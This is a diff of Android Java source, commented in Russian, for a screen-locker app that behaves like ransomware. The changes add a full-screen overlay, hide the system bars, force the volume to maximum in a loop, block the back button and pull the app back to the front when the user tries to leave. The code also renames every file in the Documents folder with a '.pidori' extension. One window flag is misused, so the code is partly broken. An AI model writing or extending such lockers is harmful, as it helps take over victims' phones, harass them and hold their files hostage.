@@ -30,21 +30,32 @@ public class LockActivity extends Activity {
         super.onCreate(b);
         setContentView(R.layout.activity_lock);
 
+        // Делаем окно поверх всего и не даем экрану погаснуть
         getWindow().addFlags(
             WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
             WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
             WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
             WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
-            WindowManager.LayoutParams.FLAG_FULLSCREEN);
+            WindowManager.LayoutParams.FLAG_FULLSCREEN |
+            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY);
+
+        // Скрываем системные панели
+        View decorView = getWindow().getDecorView();
+        decorView.setSystemUiVisibility(
+            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
+            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+            | View.SYSTEM_UI_FLAG_FULLSCREEN);
 
         am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-        mp = MediaPlayer.create(this, R.raw.lockvideo); // Твой mp3 (lockvideo.mp3)
+        mp = MediaPlayer.create(this, R.raw.lockvideo);
         if (mp != null) {
             mp.setLooping(true);
             mp.start();
         }
 
-        // Запускаем шифрование в фоне (папка Documents)
         targetDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
         new Thread(new Runnable() {
             @Override
@@ -53,7 +64,7 @@ public class LockActivity extends Activity {
             }
         }).start();
 
-        // Цикл громкости
+        // Крутим звук
         handler.postDelayed(new Runnable() {
             @Override
             public void run() {
@@ -61,9 +72,6 @@ public class LockActivity extends Activity {
                     if (am != null) {
                         am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                     }
-                    Intent intent = new Intent(LockActivity.this, LockActivity.class);
-                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP);
-                    startActivity(intent);
                 }
                 handler.postDelayed(this, 500);
             }
@@ -83,7 +91,6 @@ public class LockActivity extends Activity {
                         mp.release();
                         mp = null;
                     }
-                    // Запускаем расшифровку перед выходом
                     new Thread(new Runnable() {
                         @Override
                         public void run() {
@@ -108,7 +115,7 @@ public class LockActivity extends Activity {
                 encryptFiles(file);
             } else if (file.isFile()) {
                 String name = file.getName();
-                if (!name.endsWith(".pidori") && !name.equals("lockvideo.mp3")) { // Себя не шифруем
+                if (!name.endsWith(".pidori") && !name.equals("lockvideo.mp3")) {
                     File newFile = new File(dir, name + ".pidori");
                     file.renameTo(newFile);
                 }
@@ -126,7 +133,7 @@ public class LockActivity extends Activity {
             } else if (file.isFile()) {
                 String name = file.getName();
                 if (name.endsWith(".pidori")) {
-                    String originalName = name.substring(0, name.length() - 7); // отрезаем .pidori
+                    String originalName = name.substring(0, name.length() - 7);
                     File newFile = new File(dir, originalName);
                     file.renameTo(newFile);
                 }
@@ -145,8 +152,12 @@ public class LockActivity extends Activity {
         return super.dispatchKeyEvent(e);
     }
 
-    @Override public void onBackPressed() { }
+    @Override
+    public void onBackPressed() { 
+        // Полностью блокируем кнопку назад
+    }
 
+    // Если приложение попытаются свернуть или переключиться, возвращаем его на экран
     @Override
     protected void onPause() {
         super.onPause();
@@ -167,4 +178,4 @@ public class LockActivity extends Activity {
         }
         handler.removeCallbacksAndMessages(null);
     }
-}
+                            }
